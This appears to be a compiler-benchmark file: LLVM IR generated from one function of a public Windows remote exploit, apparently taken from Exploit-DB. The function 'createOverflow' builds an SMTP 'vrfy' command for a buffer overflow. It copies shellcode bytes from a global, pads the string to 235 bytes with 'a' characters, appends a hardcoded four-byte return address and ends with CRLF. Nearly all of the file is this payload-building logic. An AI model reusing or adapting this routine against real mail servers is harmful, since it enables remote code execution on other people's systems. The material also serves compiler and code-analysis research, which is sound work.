; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19561.c_createOverflow.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19561.c_createOverflow.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@start = common dso_local global i64 0, align 8
@size = common dso_local global i32 0, align 4
@s = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"vrfy xxxxx\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Created overflow string.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @createOverflow() #0 {
  %1 = alloca [236 x i8], align 16
  %2 = alloca [236 x i8], align 16
  %3 = alloca [5 x i8], align 1
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i8*, align 8
  %7 = load i64, i64* @start, align 8
  store i64 %7, i64* %5, align 8
  store i32 0, i32* %4, align 4
  br label %8

8:                                                ; preds = %22, %0
  %9 = load i32, i32* %4, align 4
  %10 = load i32, i32* @size, align 4
  %11 = icmp ult i32 %9, %10
  br i1 %11, label %12, label %25

12:                                               ; preds = %8
  %13 = load i64, i64* %5, align 8
  %14 = inttoptr i64 %13 to i8*
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8, i8* %15, align 1
  %17 = load i32, i32* %4, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [236 x i8], [236 x i8]* %1, i64 0, i64 %18
  store i8 %16, i8* %19, align 1
  %20 = load i64, i64* %5, align 8
  %21 = add i64 %20, 1
  store i64 %21, i64* %5, align 8
  br label %22

22:                                               ; preds = %12
  %23 = load i32, i32* %4, align 4
  %24 = add i32 %23, 1
  store i32 %24, i32* %4, align 4
  br label %8

25:                                               ; preds = %8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds [236 x i8], [236 x i8]* %1, i64 0, i64 %27
  store i8 0, i8* %28, align 1
  %29 = getelementptr inbounds [236 x i8], [236 x i8]* %1, i64 0, i64 0
  %30 = call i32 @strlen(i8* %29)
  store i32 %30, i32* %4, align 4
  br label %31

31:                                               ; preds = %34, %25
  %32 = load i32, i32* %4, align 4
  %33 = icmp ult i32 %32, 235
  br i1 %33, label %34, label %43

34:                                               ; preds = %31
  %35 = load i32, i32* %4, align 4
  %36 = getelementptr inbounds [236 x i8], [236 x i8]* %1, i64 0, i64 0
  %37 = call i32 @strlen(i8* %36)
  %38 = sub i32 %35, %37
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [236 x i8], [236 x i8]* %2, i64 0, i64 %39
  store i8 97, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = add i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %31

43:                                               ; preds = %31
  %44 = load i32, i32* %4, align 4
  %45 = getelementptr inbounds [236 x i8], [236 x i8]* %1, i64 0, i64 0
  %46 = call i32 @strlen(i8* %45)
  %47 = sub i32 %44, %46
  %48 = zext i32 %47 to i64
  %49 = getelementptr inbounds [236 x i8], [236 x i8]* %2, i64 0, i64 %48
  store i8 0, i8* %49, align 1
  %50 = getelementptr inbounds [5 x i8], [5 x i8]* %3, i64 0, i64 0
  store i8 69, i8* %50, align 1
  %51 = getelementptr inbounds [5 x i8], [5 x i8]* %3, i64 0, i64 1
  store i8 -12, i8* %51, align 1
  %52 = getelementptr inbounds [5 x i8], [5 x i8]* %3, i64 0, i64 2
  store i8 -15, i8* %52, align 1
  %53 = getelementptr inbounds [5 x i8], [5 x i8]* %3, i64 0, i64 3
  store i8 1, i8* %53, align 1
  %54 = getelementptr inbounds [5 x i8], [5 x i8]* %3, i64 0, i64 4
  store i8 0, i8* %54, align 1
  %55 = load i32, i32* @s, align 4
  %56 = call i32 @strcpy(i32 %55, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  %57 = load i32, i32* @s, align 4
  %58 = getelementptr inbounds [236 x i8], [236 x i8]* %1, i64 0, i64 0
  %59 = call i32 (i32, ...) @strcat(i32 %57, i8* %58)
  %60 = load i32, i32* @s, align 4
  %61 = getelementptr inbounds [236 x i8], [236 x i8]* %2, i64 0, i64 0
  %62 = call i32 (i32, ...) @strcat(i32 %60, i8* %61)
  %63 = load i32, i32* @s, align 4
  %64 = getelementptr inbounds [5 x i8], [5 x i8]* %3, i64 0, i64 0
  %65 = call i32 (i32, ...) @strcat(i32 %63, i8* %64)
  %66 = load i32, i32* @s, align 4
  %67 = call i32 (i32, ...) @strcat(i32 %66, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %68 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  ret void
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i32, i8*) #1

declare dso_local i32 @strcat(i32, ...) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
